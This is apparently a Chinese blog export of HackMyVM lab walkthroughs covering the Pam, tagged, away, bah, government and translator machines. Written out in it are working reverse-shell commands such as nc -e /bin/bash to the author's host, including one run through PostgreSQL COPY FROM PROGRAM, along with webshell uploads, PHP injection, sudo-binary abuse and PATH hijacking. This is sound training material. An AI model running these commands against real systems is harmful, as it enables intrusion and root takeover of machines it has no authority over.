<p>然后查到&#x2F;etc&#x2F;hosts有写的权限，那么思路是修改&#x2F;etc&#x2F;hosts，<strong>把server.hmv的地址配置为自己kali的ip，开启apache服务并且在目录下新建一个98127651的文件</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161658.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161859.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161931.png" ></p>
<p>执行命令后再查看&#x2F;bin&#x2F;bash的权限</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162027.png" ></p>
<p>最后bash -p重新进入bash，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162119.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶场虽然是medium，但是思路都是比较常见的，感觉做完是在回顾前段时间学到的东西。涉及的知识点：wpscan扫描，爆破密码，社工工具生成字典，wordpress后台写入后门，socat端口转发，exiftool读写文件，&#x2F;etc&#x2F;hosts配置。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm pam复盘</title>
    <url>/2024/03/22/hackmyvm-pam%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址： <a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Pam" >https://hackmyvm.eu/machines/machine.php?vm=Pam<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.90</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到80和21端口，到80端口，是“phpipam is ready.”，phpipam是一个Web IP地址管理应用程序，直接访问&#x2F;phpipam后自动跳转到一个登陆页面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105140.png" ></p>
<p>尝试了注入，弱口令啥的，找不到什么可以利用的，扫目录能扫到很多子目录，还没有什么利用思路</p>
<p>转过头来看21端口，lftp用anonymous为账号密码登陆成功，到&#x2F;home目录下还能知道有一个italia账户</p>
<p>到&#x2F;var&#x2F;www&#x2F;html&#x2F;phpipam目录下有很多子目录，没什么头绪</p>
<p>这个时候看wp，让我眼前一亮，思路是<strong>用一个搜索语句搜索可以编辑上传的子目录，然后上传一个后门php，再在网页端访问反弹一个shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find -l /var/www/html| grep &quot;d.w..w..w.&quot;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105808.png" ></p>
<p>找到两个可以用的目录，我在其中一个上传一个后门</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105947.png" ></p>
<p>然后在网页访问&#x2F;phpipam&#x2F;app&#x2F;subnets&#x2F;import-subnet&#x2F;upload&#x2F;php-reverse-shell.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110136.png" ></p>
<p>成功拿到第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>输入<strong>ss -lntp</strong>查看有哪些端口开放了，注意到有一个12345端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110258.png" ></p>
<p>curl一下，拿到一大段字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110405.png" ></p>
<p>看起来像base64，拿到cyberchef解密一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112416.png" ></p>
<p>看到PNG文件头，以图片的形式保存下来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112506.png" ></p>
<p>猜测中间那一串是密码，登陆italia账户</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112614.png" ></p>
<p>拿到第二个shell</p>
<p>sudo -l查到feh可以利用，在Linux下，feh是一个基于命令行的图像查看器。它特别设计用于快速查看图像</p>
<p>看帮助文档，-A可以指定一个 shell 命令作为要在图像上执行的动作，配合-U不显示图片</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114316.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114405.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo feh -uA /bin/bash</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114517.png" ></p>
<p>提权成功，这个靶机的root.enc是加密过的，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114632.png" ></p>
<p>openssl生成的密码，而且前面拿到的那张图片，右下角有一串“-aes-256-cbc”，应该就是加密类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl enc -aes-256-cbc -d -in root.enc -out root.txt -k rootisCLOSE</span><br></pre></td></tr></table></figure>

<p>-d解密，-k指定解密时使用的密钥，解密出来成功拿到flag</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>ftp上传后门，查看内部开放端口，feh的利用，openssl解密</p>
<p>最有收获的是在ftp那里搜索看编辑的目录，学习了。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm 思路复盘2</title>
    <url>/2024/03/21/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%862/</url>
    <content><![CDATA[<h3 id="tagged"><a href="#tagged" class="headerlink" title="tagged"></a>tagged</h3><p>靶机ip：192.168.64.98</p>
<p>扫到有80端口和7746端口，然后到了80端口一访问就提示tagged.hmv，第一时间配置hosts文件，然后看到源码有一句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tagged.hmv</span><br><span class="line"></span><br><span class="line">&lt;!-- http://xxx.tagged.hmv :D --&gt;</span><br></pre></td></tr></table></figure>

<p>自然就想到了扫子域名，结果扫不到，然后扫了目录，扫到了index.php，report.php，report.html但是没有内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235025.png" ></p>
<p>访问index.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235123.png" ></p>
<h5 id="第一个点"><a href="#第一个点" class="headerlink" title="第一个点"></a>第一个点</h5><p><strong>借助7746端口配合index.php反弹shell</strong></p>
<p>不知道是些什么东西，在这里就被卡住了，看了题解才明白，<strong>当我们nc连接7746端口时输入的数据会被写入到index.php中</strong>，所以后来再访问index.php会出现很乱的东西，就是nmap扫描的时候留下的记录（而且7746端口被nmap扫描后会关闭，重启靶机就好了），我们自己连接7746端口发送数据验证一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235415.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-21%2023.54.35.png" ></p>
<p>是成功的，其实现在回看可以在最上面看到nmap，如果做的时候能有多一些联想就好了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235555.png" ></p>
<p>接下来就是给7746端口发送php命令反弹shell，再访问index.php，就能接收到了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235737.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235755.png" ></p>
<h5 id="第二个点"><a href="#第二个点" class="headerlink" title="第二个点"></a>第二个点</h5><p><strong>分析代码，顺应逻辑拿到用户的shell</strong></p>
<p>拿到了www-data的shell，在html目录下，有个.go文件，拿给ai分析一下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span>     <span class="comment">// 用于提供读取输入的帮助函数</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>       <span class="comment">// 提供格式化输入输出功能</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span>       <span class="comment">// 提供网络编程功能</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span>        <span class="comment">// 提供操作系统功能</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span>       <span class="comment">// 提供日志功能</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span>   <span class="comment">// 用于执行外部命令</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span>   <span class="comment">// 提供字符串处理功能</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 监听TCP连接在7746端口</span></span><br><span class="line">    ln, _ := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:7746&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// 接受连接</span></span><br><span class="line">        conn, _ := ln.Accept()</span><br><span class="line">        <span class="comment">// 启动两个并发的goroutine来处理接收和发送数据</span></span><br><span class="line">        <span class="keyword">go</span> receiveData(conn)</span><br><span class="line">        <span class="keyword">go</span> sendData(conn, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 发送数据到客户端的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendData</span><span class="params">(conn net.Conn, mensaje <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 将消息发送到连接</span></span><br><span class="line">    fmt.Fprintf(conn, mensaje)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 接收来自客户端的数据并处理的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receiveData</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> tohtml <span class="type">string</span></span><br><span class="line">        <span class="comment">// 发送提示符给客户端</span></span><br><span class="line">        sendData(conn, <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="comment">// 读取客户端发送的消息</span></span><br><span class="line">        message, _ := bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment">// 去除消息末尾的换行符</span></span><br><span class="line">        message = strings.TrimRight(message, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="comment">// 将消息格式化为HTML格式</span></span><br><span class="line">        tohtml = <span class="string">&quot;&lt;pre&gt;&quot;</span> + message + <span class="string">&quot;&lt;/pre&gt;&quot;</span></span><br><span class="line">        <span class="comment">// 如果收到特定消息，则执行外部命令</span></span><br><span class="line">        OMG := <span class="string">&quot;Deva&quot;</span></span><br><span class="line">        <span class="keyword">if</span> message == OMG &#123;</span><br><span class="line">            cmd := exec.Command(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;7777&quot;</span>)</span><br><span class="line">            _ = cmd.Run()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 打开文件用于追加，并将HTML消息写入文件</span></span><br><span class="line">        file, err := os.OpenFile(<span class="string">&quot;/var/www/html/index.php&quot;</span>, os.O_APPEND|os.O_WRONLY, <span class="number">0644</span>)</span><br><span class="line">        _, _ = fmt.Fprintln(file, tohtml)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            log.Fatal(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭文件</span></span><br><span class="line">        <span class="keyword">defer</span> file.Close()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用一是展示了向7746端口输入信息会被写入到index.php，二是让我们知道，当我们向7746端口发送“Deva”时，靶机会向本地的7777端口反弹一个shell，那么接下来就是给7746端口发送信息，同时在刚拿到的shell开启7777端口监听</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322000433.png" ></p>
<p>顺利拿到shyla的账户</p>
<h5 id="第三个点"><a href="#第三个点" class="headerlink" title="第三个点"></a>第三个点</h5><p><strong>借助goaccess给report.php标题写入恶意代码，再免密码执行</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322000556.png" ></p>
<p>sudo -l看到有goaccess和report.php（空的）可以利用，查了goaccess的作用，是一个可以实现可视化的web日志分析工具，查看了帮助文档，研究半天没有思路，最后看wp知道以下三个比较可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f --log-file=&lt;filename&gt;        - Path to input log file.</span><br><span class="line">-o --output=file.html|json|csv  - Output either an HTML, JSON or a CSV file.</span><br><span class="line">--html-report-title=&lt;title&gt;     - Set HTML report page title and header.</span><br></pre></td></tr></table></figure>

<p>先随便在当前目录下创建一个a.log，然后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title=&quot;&lt;?php system(&#x27;bash&#x27;);?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>以uma的身份执行goaccess，分析a.log然后把结果写到report.html，标题写入php代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shyla@tagged:~$ <span class="built_in">ls</span></span><br><span class="line">a.log  magiccode  user.txt</span><br><span class="line">shyla@tagged:~$ sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title=<span class="string">&quot;&lt;?php system(&#x27;bash&#x27;);?&gt;&quot;</span></span><br><span class="line">shyla@tagged:~$ sudo /usr/bin/php /var/www/html/report.php</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root@tagged:/home/shyla<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) grupos=0(root)</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<h3 id="away"><a href="#away" class="headerlink" title="away"></a>away</h3><p>开了80和22端口，访问80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322003701.png" ></p>
<p>给了一个用户名，下面的东西是ED25519密钥生成时产生的界面，大概就是提示和这种类型的密钥有关（整个靶场都和这个有关系）。</p>
<p>拿到了用户名尝试爆破出tula的ssh密码，然而他需要私钥文件登陆，查询了一下ED25519密钥的私钥文件名是id_ed25519，现在就需要找到这个密钥文件，扫目录扫半天扫不出东西，看了wp才知道，直接就放在了网页目录下。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004502.png" ></p>
<p>拿到后保存到本地，有了私钥文件登陆还需要密码（在公钥文件写了）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004638.png" ></p>
<p>成功拿到第一个shell</p>
<p>sudo -l看到可以免密码用lula运行webhook，查看帮助文档</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004921.png" ></p>
<p>需要用到的是 -hooks和-verbosre，需要一个json文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322005017.png" ></p>
<p>在github找到了这个项目，中间可以写一个自己的sh文件，我写了一个&#x2F;tmp&#x2F;a.sh，然后编辑.json文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tula@away:/tmp$ <span class="built_in">cat</span> a.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc -e /bin/bash 192.168.64.3 8888</span><br><span class="line">tula@away:/tmp$ <span class="built_in">cd</span></span><br><span class="line">tula@away:~$ <span class="built_in">ls</span></span><br><span class="line">hooks.json  user.txt</span><br><span class="line">tula@away:~$ <span class="built_in">cat</span> hooks.json</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cleanup-webhook&quot;</span>,</span><br><span class="line">    <span class="string">&quot;execute-command&quot;</span>: <span class="string">&quot;/tmp/a.sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;command-working-directory&quot;</span>: <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>然后就开启了服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tula@away:~$ sudo -u lula /usr/bin/webhook -hooks hooks.json -verbose</span><br><span class="line">[webhook] 2024/03/21 17:54:24 version 2.6.9 starting</span><br><span class="line">[webhook] 2024/03/21 17:54:24 setting up os signal watcher</span><br><span class="line">[webhook] 2024/03/21 17:54:24 attempting to load hooks from hooks.json</span><br><span class="line">[webhook] 2024/03/21 17:54:24 os signal watcher ready</span><br><span class="line">[webhook] 2024/03/21 17:54:24 found 1 hook(s) <span class="keyword">in</span> file</span><br><span class="line">[webhook] 2024/03/21 17:54:24 	loaded: cleanup-webhook</span><br><span class="line">[webhook] 2024/03/21 17:54:24 serving hooks on http://0.0.0.0:9000/hooks/&#123;<span class="built_in">id</span>&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候还没弹到shell，还要访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.64.97:9000/hooks/cleanup-webhook</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322005703.png" ></p>
<p>成功拿到lula的shell，搜寻提权方法，用**&#x2F;usr&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null**查到more有read_and_search权限</p>
<p>接下来的思路是利用more读取&#x2F;root&#x2F;.ssh下的私钥文件，依旧是id_ed25519，保存下来ssh登陆</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322010551.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lula@away:/tmp$ ssh root@127.0.0.1 -i id_ed25519</span><br><span class="line">ssh root@127.0.0.1 -i id_ed25519</span><br><span class="line">Linux away 5.10.0-15-amd64 <span class="comment">#1 SMP Debian 5.10.120-1 (2022-06-09) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Jun 17 11:14:38 2022</span><br><span class="line">root@away:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<h3 id="bah"><a href="#bah" class="headerlink" title="bah"></a>bah</h3><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Bah" >https://hackmyvm.eu/machines/machine.php?vm=Bah<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：192.168.64.105</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到80和3306端口，先看看80，是个qdpm框架，他有一个密码暴露的poc（<a class="link"   href="https://www.exploit-db.com/exploits/50176%EF%BC%89" >https://www.exploit-db.com/exploits/50176）<i class="fas fa-external-link-alt"></i></a></p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105323.png"   style="zoom:50%;" >

<p>访问‘&#x2F;core&#x2F;config&#x2F;databases.yml’，下载到一个yml文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105519.png" ></p>
<p>可以看到账号密码，用来登陆mysql</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105601.png" ></p>
<p>看到hidden数据库比较可疑</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105700.png"   style="zoom:50%;" >

<p>得到一批url和账号密码，先把url都保存成字典，然后fuff一下</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325110024.png"   style="zoom:50%;" >

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -c -r -u http://192.168.64.105 -H &quot;HOST: FUZZ&quot;  -w url.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-25%2011.01.44.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>可以看到party.bah.hmv比较不一样，配置一个hosts文件然后访问，是一个网页版终端，用之前拿到的yml文件里面的账号密码登陆，查看&#x2F;etc&#x2F;passwd，发现有个rocio用户，前面数据库查询中有拿到他的密码，直接切换用户</p>
<p>做了一些常规的搜寻，没找到怎么提权方式，下载一个pspy64看看，发现</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111440.png" ></p>
<p>这是启动 Shell In A Box 服务，重点是最后的“**-s &#x2F;devel:root:root:&#x2F;:&#x2F;tmp&#x2F;dev**”，指定了另一个路径 <code>/devel</code>，访问该路径时会直接以 root 用户身份进入 <code>/tmp/dev</code> 目录，而且是以root执行。</p>
<p>所以思路是我们创建一个&#x2F;tmp&#x2F;dev，然后在网页端访问&#x2F;devel去执行&#x2F;tmp&#x2F;dev</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111819.png" ></p>
<p>接下来就是本地开启监听，然后去访问&#x2F;devel</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111914.png" ></p>
<p>提权成功</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>学习了host的fuzz，最后shellbox的语句，要查阅资料才能读懂，很有趣。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm government复盘</title>
    <url>/2024/06/20/hackmyvm-government%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫端口扫到21、22、80，先看21端口</p>
<p>lftp连接可以看到有几个文件夹，里面都是一些txt</p>
<p>有看到以下信息（对后续有点用）</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620194452.png"   style="zoom:50%;" >

<p>还有这两个个文件，是一些md5加密后的数据（都能解开），还有几个用户名，保存下来hydra爆破ssh失败</p>
<p>还有一些其他的txt，不知道能干嘛</p>
<p>转向80端口，扫目录有不少东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195058.png" ></p>
<p>最开始看了一下&#x2F;blog下面的，看不出什么cms，也没什么功能的，目录倒是很开放（没什么用</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>后来看了phppgadmin，是个数据库管理界面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195222.png" ></p>
<p>有个登录口，尝试使用 postgres:admin 弱口令登录（这个用户名有点没想到），登录成功，查找相关的漏洞</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195343.png" ></p>
<p>直接可以反弹shell了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;nc -e /bin/bash 192.168.64.3 1234&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195510.png" ></p>
<p>注意那个Paginate results不用勾选，然后成功反弹到shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195628.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>寻找了很久，发现在&#x2F;var&#x2F;log下有个.creds.log</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195807.png" ></p>
<p>结合前面ftp看到的信息，可以知道是Blowfish加密，key和IV都给出来了，用工具解密即可</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195936.png" ></p>
<p>拿到一串密钥，登录erik用户，能够拿到user.txt</p>
<p>查找suid提权</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620200131.png" ></p>
<p>发现&#x2F;home&#x2F;erik&#x2F;backups&#x2F;nuclear下有个remove，用strings看一下大概是干嘛的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-20%2020.06.32.png" ></p>
<p>可以知道执行了time命令，接下来的思路就是环境变量劫持了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;/bin/bash -p&#x27;&gt;/tmp/time</span><br><span class="line">chmod +x /tmp/time</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./remove a</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620200824.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>前面ftp和80端口的&#x2F;blog太迷惑人，还有就是找到.creds.log要细心，其他地方都还好。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm 复盘合集1</title>
    <url>/2024/03/16/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%861/</url>
    <content><![CDATA[<h3 id="translator"><a href="#translator" class="headerlink" title="translator"></a>translator</h3><p>来到80端口看到有个translator的界面，随便输了abc，返回zyx，试了几次确认加密逻辑就是一对一替换，a-z，b-y这样，但是数字和大写字母是不会变的，扫了目录也没看到有什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.15.54.png" ></p>
<p>然后看了wp才知道，<strong>这个输入框可以命令注入，要先有个分号隔断，并且要输入的命令要先transalte一下</strong>（有点解谜），比如要使用id命令，就要输入“；rw”</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.22.42.png"   alt="像这样" style="zoom:50%;" >

<p>那就先nc拿到一个shell，主要要先把命令translate一下</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316182706.png"   style="zoom:50%;" >

<p>就拿到第一个shell，我感觉有点脑洞，可能是见识的不够多吧，代码逻辑如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test = $_GET[&#x27;hmv&#x27;];</span><br><span class="line">$test = escapeshellcmd($test);// 应该是用来防止命令注入的，输入分号后前面跟了一个\，但是经过下面第一个system斜杆又没了</span><br><span class="line">echo (&quot;Translated to:&quot;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$ultima_linea = system(&#x27;echo &#x27;.$test.&#x27;| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba&#x27;);</span><br><span class="line">$ulti = system(&#x27;echo &#x27;.$ultima_linea.&#x27;| tr &quot;php&quot; &quot;wtf&quot;&#x27;); // 用分号实现命令注入</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后在html目录下有个hvxing文件，打开查看是段字符串，第一反应是拿去网页translate一下</p>
<p>然后就拿到一个密码，到&#x2F;home目录下看到有两个用户，尝试了一下ocean登陆成功</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185134.png"   style="zoom:50%;" >

<p>然后sudo -l看到有choom可以利用，india可以不用密码，gtfobins查询到了提权命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u india /usr/bin/choom -n 0 /bin/sh</span><br></pre></td></tr></table></figure>

<h4 id="第二个flag"><a href="#第二个flag" class="headerlink" title="第二个flag"></a>第二个flag</h4><p>就切换到了india账户，再sudo -l查找，有一个trans可以利用，file看了一下是个是个shell的脚本</p>
<p>cat看了一下内容很多，切换个思路-h看看帮助文档</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185857.png"   style="zoom:50%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185917.png"   style="zoom:50%;" >

<p>注意到有input file也可以开个http代理，那就尝试结合这两个功能把&#x2F;root&#x2F;root.txt读出来</p>
